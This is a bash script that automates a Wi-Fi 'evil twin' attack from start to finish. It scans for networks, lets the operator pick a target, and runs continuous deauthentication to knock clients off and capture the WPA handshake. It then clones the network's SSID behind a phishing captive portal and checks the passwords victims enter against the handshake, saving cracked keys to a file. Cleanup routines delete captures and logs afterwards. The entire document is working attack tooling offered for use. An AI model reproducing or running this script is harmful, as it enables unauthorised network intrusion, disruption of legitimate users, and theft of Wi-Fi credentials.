#!/bin/bash
# Evil Twin

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Function: Print colored output
log_info() { echo -e "${GREEN}[*]${NC} $1"; }
log_warn() { echo -e "${YELLOW}[!]${NC} $1"; }
log_error() { echo -e "${RED}[-]${NC} $1"; }
log_success() { echo -e "${GREEN}[✓]${NC} $1"; }

# Global variables
TARGET_BSSID=""
TARGET_SSID=""
TARGET_CHANNEL=""
FAKE_SSID=""
HANDSHAKE_FILE=""
DEAUTH_PID=""  # ADDED: For continuous deauth

# ==================== CLEANUP FUNCTION ====================
cleanup() {
    echo ""
    log_info "Shutting down attack..."
    
    # Kill all background processes silently
     pkill -f hostapd 2>/dev/null
     pkill -f dnsmasq 2>/dev/null
     pkill -f airodump-ng 2>/dev/null
     pkill -f aireplay-ng 2>/dev/null
     pkill -f "php -S" 2>/dev/null
     pkill -f passapi.py 2>/dev/null
     fuser -k 5000/tcp 2>/dev/null
     fuser -k 80/tcp 2>/dev/null
    
    # Specifically kill the deauth process if still running
    [ -n "$DEAUTH_PID" ] && kill $DEAUTH_PID 2>/dev/null  # ADDED
    
    # Remove virtual AP interface
     ip link set wlan1 down 2>/dev/null
     ip link del wlan1 2>/dev/null
    
    # Reset wlan2 from monitor mode SILENTLY
     airmon-ng stop wlan2 > /dev/null 2>&1
    
    # Reset iptables
     iptables --flush 2>/dev/null
    
    # Clean up routing rules silently - CELLULAR ONLY (FIXED)
    ip rule del from all lookup main pref 1 2>/dev/null || true
    ip rule del from all iif lo oif wlan1 uidrange 0-0 lookup 97 pref 11000 2>/dev/null || true
    # ip rule del from all iif lo oif wlan0 lookup main pref 17000 2>/dev/null || true  # REMOVED: WiFi sharing rule
    ip rule del from all iif lo oif rmnet_data2 lookup main pref 17000 2>/dev/null || true
    ip rule del from all iif lo oif wlan1 lookup 97 pref 17000 2>/dev/null || true
    ip rule del pref 21000 2>/dev/null || true  # FIXED: delete by priority only
    
    # ==================== ENHANCED FILE CLEANUP ====================
    log_info "Cleaning up temporary files..."
    
    # Remove all airodump-ng handshake files
    rm -f evil-*.cap evil-*.csv evil-*.kismet.* evil-*.netxml
    
    # Remove temp scan files
    rm -f /tmp/target_bssid.txt /tmp/target_channel.txt /tmp/target_ssid.txt 
    rm -f /tmp/scan* /tmp/airodump.log /tmp/deauth.log
    
    # Remove nohup output files
    rm -f nohup.out
    
    # Remove any .pcap files that might have been created
    rm -f *.pcap
    
    # Clean up temporary password files BUT PRESERVE cracked.txt
    rm -f attempts.txt password.txt
    
    # Clean up any handshake files created during this session
    if [ -n "$HANDSHAKE_FILE" ] && [ -f "$HANDSHAKE_FILE" ]; then
        rm -f "$HANDSHAKE_FILE"
    fi
    
    # Remove any SSID-based .cap files (safety check)
    if [ -n "$TARGET_SSID" ]; then
        SAFE_SSID=$(echo "$TARGET_SSID" | sed 's/[^a-zA-Z0-9]/_/g')
        rm -f "${SAFE_SSID}.cap"
    fi
    
    # Clean up process PID files if any
    rm -f *.pid
    
    log_success "Cleanup complete"
    exit 0
}
trap cleanup SIGINT SIGTERM EXIT

# ==================== GET USB DEVICE INFO ====================
get_usb_device_info() {
    local iface="$1"
    
    # Get all USB wireless devices (exclude root hubs and non-wireless)
    wireless_devices=$(lsusb | grep -i "wireless\\|network\\|wlan\\|rtl\\|atheros\\|ralink" | grep -v "root hub")
    
    if [ -n "$wireless_devices" ]; then
        # Take the first wireless USB device found
        device_name=$(echo "$wireless_devices" | head -1 | sed 's/^.*ID [0-9a-f:]\+ //')
        echo "$device_name"
    else
        # Fallback: show any non-root-hub USB device
        device_name=$(lsusb | grep -v "root hub" | tail -1 | sed 's/^.*ID [0-9a-f:]\+ //')
        echo "${device_name:-External USB Adapter}"
    fi
}

# ==================== GET PCI DEVICE INFO ====================
get_pci_device_info() {
    local iface="$1"
    
    # Get PCI device info from lspci
    if command -v lspci >/dev/null 2>&1; then
        # Get the PCI address from sysfs
        pci_addr=$(basename $(readlink /sys/class/net/$iface/device) 2>/dev/null)
        if [ -n "$pci_addr" ]; then
            lspci_output=$(lspci -s "$pci_addr" 2>/dev/null)
            if [ -n "$lspci_output" ]; then
                echo "$lspci_output" | sed 's/^[0-9a-f:]\+ //'
                return
            fi
        fi
    fi
    echo "Unknown PCI device"
}

# ==================== SELECT ADAPTER ====================
select_adapter() {
    log_info "Scanning for wireless adapters..."
    
    # Get all wireless interfaces using iw
    interfaces=($(iw dev 2>/dev/null | grep "Interface" | awk '{print $2}'))
    
    if [ ${#interfaces[@]} -eq 0 ]; then
        log_error "No wireless interfaces found"
        exit 1
    fi
    
    declare -A adapter_map
    counter=1
    
    echo "Interface     PHY    Driver       Device"
    echo "========================================================"
    
    for iface in "${interfaces[@]}"; do
        # Get PHY information
        phy=$(iw dev "$iface" info 2>/dev/null | grep "wiphy" | awk '{print "phy"$2}')
        
        # Get driver information
        driver=""
        if command -v ethtool >/dev/null 2>&1; then
            driver=$(ethtool -i "$iface" 2>/dev/null | grep "driver:" | cut -d: -f2 | sed 's/^[[:space:]]*//')
        fi
        
        # If ethtool failed, try sysfs
        if [ -z "$driver" ] && [ -d "/sys/class/net/$iface/device/driver" ]; then
            driver=$(basename $(readlink /sys/class/net/$iface/device/driver) 2>/dev/null)
        fi
        
        # Get chipset/device information
        chipset="Unknown"
        if [ -d "/sys/class/net/$iface/device" ]; then
            # Check if it's a USB device by looking at the device and driver paths
            device_path=$(readlink -f "/sys/class/net/$iface/device" 2>/dev/null)
            driver_path=$(readlink -f "/sys/class/net/$iface/device/driver" 2>/dev/null)
            
            if echo "$device_path" | grep -q "/usb" || echo "$driver_path" | grep -q "/usb"; then
                chipset=$(get_usb_device_info "$iface")
            # Check if it's a PCI device
            elif echo "$device_path" | grep -q "/pci" || echo "$driver_path" | grep -q "/pci"; then
                chipset=$(get_pci_device_info "$iface")
            else
                chipset="Built-in"
            fi
        else
            chipset="Virtual"
        fi
        
        # Truncate long interface names for better formatting
        display_iface="$iface"
        if [ ${#iface} -gt 10 ]; then
            display_iface="${iface:0:9}~"
        fi
        
        # Truncate long device names for better formatting
        display_chipset="$chipset"
        if [ ${#chipset} -gt 25 ]; then
            display_chipset="${chipset:0:24}~"
        fi
        
        adapter_map[$counter]="$iface"
        printf " ${GREEN}%2d.${NC} %-11s %-6s %-12s %s\n" "$counter" "$display_iface" "$phy" "$driver" "$display_chipset"
        ((counter++))
    done
    
    echo "========================================================"
    
    # Auto-select if only one physical interface
    physical_count=0
    for iface in "${interfaces[@]}"; do
        if [ -d "/sys/class/net/$iface/device" ]; then
            ((physical_count++))
        fi
    done
    
    if [ $physical_count -eq 1 ]; then
        for iface in "${interfaces[@]}"; do
            if [ -d "/sys/class/net/$iface/device" ]; then
                SELECTED_INTERFACE="$iface"
                log_info "Auto-selected: $SELECTED_INTERFACE"
                return 0
            fi
        done
    fi
    
    # Get user selection
    while true; do
        read -p "Select interface (1-$((counter-1))): " selection
        if [[ "$selection" =~ ^[0-9]+$ ]] && [ "$selection" -ge 1 ] && [ "$selection" -le $((counter-1)) ]; then
            SELECTED_INTERFACE="${adapter_map[$selection]}"
            break
        else
            log_error "Invalid selection"
        fi
    done
}   

# ==================== RENAME ADAPTER ====================
rename_adapter() {
    log_info "Preparing adapter: $SELECTED_INTERFACE"
    
    # Verify interface exists
    while ! ip link show "$SELECTED_INTERFACE" > /dev/null 2>&1; do
        echo -n "."
        sleep 1
    done
    echo ""
    
    # Rename to wlan2 (only if it's not already wlan2)
    if [ "$SELECTED_INTERFACE" != "wlan2" ]; then
        sudo ip link set "$SELECTED_INTERFACE" down
        sudo ip link set "$SELECTED_INTERFACE" name wlan2
        log_success "Renamed $SELECTED_INTERFACE to wlan2"
    else
        log_info "Interface already named wlan2"
    fi
    
    sudo ip link set wlan2 up
    log_success "Adapter ready (wlan2)"
}

# ==================== SCAN NETWORKS ====================
scan_networks() {
    log_info "Scanning for networks..."
    
    sudo airmon-ng start wlan2 > /dev/null 2>&1
    sleep 5
    
    log_info "Scanning for 20 seconds..."
    timeout 20 sudo airodump-ng wlan2 --output-format csv -w /tmp/scan > /dev/null 2>&1 || true
    
    if [ ! -f "/tmp/scan-01.csv" ]; then
        log_error "No networks found"
        exit 1
    fi
    
    log_info "Available networks:"
    echo "----------------------------------------"
    
    counter=1
    declare -A network_map
    in_ap_section=true

    while IFS= read -r line; do
        [[ -z "$line" ]] && continue
        if [[ "$line" == "Station MAC"* ]]; then
            in_ap_section=false
            continue
        fi
        
        if [ "$in_ap_section" = true ] && [[ "$line" != "BSSID"* ]]; then
            bssid=$(echo "$line" | cut -d, -f1 | xargs)
            channel=$(echo "$line" | cut -d, -f4 | xargs)
            essid=$(echo "$line" | cut -d, -f14 | xargs)
            
            if [[ "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] && [[ -n "$essid" ]]; then
                network_map[$counter]="$bssid|$channel|$essid"
                printf " ${GREEN}%2d.${NC} %-25s [Ch %s]\n" "$counter" "$essid" "$channel"
                ((counter++))
            fi
        fi
    done < /tmp/scan-01.csv
    
    echo "----------------------------------------"
    
    if [ $counter -eq 1 ]; then
        log_error "No networks detected"
        exit 1
    fi
    
    read -p "Select target (1-$((counter-1))): " selection
    
    if [[ ! "$selection" =~ ^[0-9]+$ ]] || [ "$selection" -lt 1 ] || [ "$selection" -ge $counter ]; then
        log_error "Invalid selection"
        exit 1
    fi
    
    IFS='|' read -r TARGET_BSSID TARGET_CHANNEL TARGET_SSID <<< "${network_map[$selection]}"
    TARGET_BSSID=$(echo "$TARGET_BSSID" | xargs)
    TARGET_CHANNEL=$(echo "$TARGET_CHANNEL" | xargs)
    TARGET_SSID=$(echo "$TARGET_SSID" | xargs)
    FAKE_SSID="$TARGET_SSID"
    
    log_success "Target: $TARGET_SSID (${TARGET_BSSID:0:8}...) on channel $TARGET_CHANNEL"
}

# ==================== CAPTURE HANDSHAKE ====================
capture_handshake() {
    local bssid="$1"
    local channel="$2"
    local ssid="$3"
    
    log_info "Capturing handshake..."
    
    sudo iwconfig wlan2 channel "$channel" 2>/dev/null
    sleep 2
    
    nohup sudo airodump-ng -c "$channel" --bssid "$bssid" -w evil wlan2 > /tmp/airodump.log 2>&1 &
    AIRODUMP_PID=$!
    sleep 3
    
    # Start CONTINUOUS deauth and save PID globally (MODIFIED)
    nohup sudo aireplay-ng -0 0 -a "$bssid" wlan2 > /tmp/deauth.log 2>&1 &
    DEAUTH_PID=$!  # SAVE PID FOR CONTINUOUS DEAUTH
    
    log_info "Deauth running - waiting for handshake..."
    
    HANDSAKE_CAPTURED=false
    for i in {1..60}; do
        if aircrack-ng evil-01.cap 2>/dev/null | grep -q "1 handshake"; then
            log_success "Handshake captured!"
            HANDSAKE_CAPTURED=true
            break
        fi
        sleep 10
    done
    
    # KILL ONLY AIRODUMP, NOT DEAUTH! (MODIFIED)
    sudo kill $AIRODUMP_PID 2>/dev/null
    # DEAUTH KEEPS RUNNING!
    sleep 2
    
    if [ "$HANDSAKE_CAPTURED" = true ]; then
        # Save handshake with network name
        HANDSHAKE_FILE="${ssid//[^a-zA-Z0-9]/_}.cap"
        cp evil-01.cap "$HANDSHAKE_FILE"
        log_success "Handshake saved as: $HANDSHAKE_FILE"
    else
        log_warn "No handshake captured - continuing anyway"
        read -p "Continue? (y/n): " choice
        if [[ ! "$choice" =~ ^[Yy]$ ]]; then
            # Kill deauth if user chooses to exit
            [ -n "$DEAUTH_PID" ] && kill $DEAUTH_PID 2>/dev/null
            exit 1
        fi
    fi
}

# ==================== UPDATE CONFIGURATIONS ====================
update_configs() {
    local bssid="$1"
    local channel="$2"
    local ssid="$3"
    
    log_info "Configuring attack..."
    
    # Create handshake file name
    HANDSHAKE_FILE="${ssid//[^a-zA-Z0-9]/_}.cap"
    
    if [ -f "passapi.py" ]; then
        sed -i "s/target = .*/target = '$bssid'/" passapi.py
        sed -i "s/ssid_name = .*/ssid_name = '$ssid'/" passapi.py
        sed -i "s/handshake_file = .*/handshake_file = '$HANDSHAKE_FILE'/" passapi.py
    else
        log_error "passapi.py not found!"
        exit 1
    fi
    
    if [ -f "hostapd.conf" ]; then
        sed -i "s/^ssid=.*/ssid=$ssid/" hostapd.conf
        sed -i "s/^channel=.*/channel=$channel/" hostapd.conf
    else
        log_error "hostapd.conf not found!"
        exit 1
    fi
}

# ==================== START EVIL TWIN ====================
start_evil_twin() {
    log_info "Starting evil twin..."
    
    # Always use cellular (4G) for internet sharing (MODIFIED)
    ./4g-ap.sh > /dev/null 2>&1 &
    sleep 8
    
    # Start backend with GUARANTEED silence
    python3 passapi.py > /dev/null 2>&1 &
    sleep 3
    
    # Start portal silently
    cd portal
    php -S 10.0.0.1:80 router.php > /dev/null 2>&1 &
    cd ..
    sleep 8
    log_success "Evil twin is live"
}

# ==================== MONITOR ATTACK ====================
monitor_attack() {
    local bssid="$1"
    
    # DEAUTH IS ALREADY RUNNING FROM CAPTURE PHASE! (MODIFIED)
    log_info "Continuous deauth maintained from capture phase"
    
    # Clean layout
    echo "==============================="
    echo "ATTACK RUNNING"
    echo "==============================="
    echo "Target:    $TARGET_SSID"
    echo "Evil Twin: $FAKE_SSID" 
    echo "Channel:   $TARGET_CHANNEL"
    echo "Internet:  4G Cellular"  # MODIFIED
    echo "Handshake: $HANDSHAKE_FILE"
    echo "Deauth:    CONTINUOUS"  # MODIFIED
    echo "----------------------------------------"
    echo "Monitoring for credentials..."
    echo "----------------------------------------"
    
    # Track attempts
    last_attempt_count=0
    password_found=false

    while true; do
        # Check for cracked password
        if [ -f "password.txt" ] && [ -s "password.txt" ]; then
            temp_pass=$(cat password.txt | head -1 | tr -d '[:space:]')
            if aircrack-ng "$HANDSHAKE_FILE" -b "$TARGET_BSSID" -w password.txt 2>/dev/null | grep -q "KEY FOUND"; then
                echo ""
                echo -e "${GREEN}PASSWORD CRACKED: $temp_pass${NC}"
                
                # Archive to permanent cracked.txt file
                timestamp=$(date +"%Y-%m-%d %H:%M:%S")
                echo "$timestamp | SSID: $TARGET_SSID | BSSID: $TARGET_BSSID | Password: $temp_pass" >> cracked.txt
                echo -e "${GREEN}Cracked Network Saved in: cracked.txt${NC}"
                echo ""
                
                # Stop deauth only when password is cracked (MODIFIED)
                [ -n "$DEAUTH_PID" ] && kill $DEAUTH_PID 2>/dev/null
                
                # Wait 30 seconds before ending
                echo "Waiting 30 seconds before shutdown..."
                for i in {30..1}; do
                    echo -ne "Shutting down in: $i seconds\r"
                    sleep 1
                done
                echo ""
                
                echo -e "${GREEN}Attack completed successfully!${NC}"
                password_found=true
                break
            fi
        fi
        
        # Show new attempts - CLEAN VERSION
        if [ -f "attempts.txt" ] && [ -s "attempts.txt" ]; then
            # Get current count (each line is a password)
            current_count=$(wc -l < attempts.txt 2>/dev/null)
            
            if [ $current_count -gt $last_attempt_count ]; then
                # Get only the new password attempts
                new_attempts=$(tail -n $((current_count - last_attempt_count)) attempts.txt 2>/dev/null)
                
                if [ ! -z "$new_attempts" ]; then
                    echo ""
                    echo "NEW PASSWORD ATTEMPTS:"
                    echo "$new_attempts" | while read -r line; do
                        if [ ! -z "$line" ]; then
                            echo "  $line"
                        fi
                    done
                    echo ""
                fi
                last_attempt_count=$current_count
            fi
        fi
        
        sleep 5
    done
}

# ==================== MAIN EXECUTION ====================
main() {
    echo "========================================"
    echo "      EVIL TWIN ATTACK"
    echo "========================================"
    
    if [ "$EUID" -ne 0 ]; then
        log_error "Run as root: sudo $0"
        exit 1
    fi
    
    # ENHANCED DEPENDENCY CHECK (ADDED)
    echo -e "${BLUE}[*] Checking dependencies...${NC}"
    
    # System packages
    for cmd in aircrack-ng hostapd dnsmasq python3 php iw airmon-ng ethtool; do
        if command -v "$cmd" &>/dev/null; then
            echo -e "  ${GREEN}[✓]${NC} $cmd"
        else
            echo -e "  ${RED}[✗]${NC} $cmd"
            log_error "Missing: $cmd"
            exit 1
        fi
    done
    
    # Python modules
    if python3 -c "import flask" 2>/dev/null; then
        echo -e "  ${GREEN}[✓]${NC} flask"
    else
        echo -e "  ${RED}[✗]${NC} flask"
        log_error "Missing Flask module"
        echo "Install with: pip3 install flask"
        exit 1
    fi
    
    echo -e "${GREEN}✅ All dependencies are installed!${NC}\n"
    
    log_info "Plug in external WiFi adapter..."
    select_adapter
    rename_adapter
    scan_networks
    capture_handshake "$TARGET_BSSID" "$TARGET_CHANNEL" "$TARGET_SSID"
    update_configs "$TARGET_BSSID" "$TARGET_CHANNEL" "$FAKE_SSID"
    # REMOVED: select_internet_source() - Always cellular now
    start_evil_twin
    monitor_attack "$TARGET_BSSID"
}

main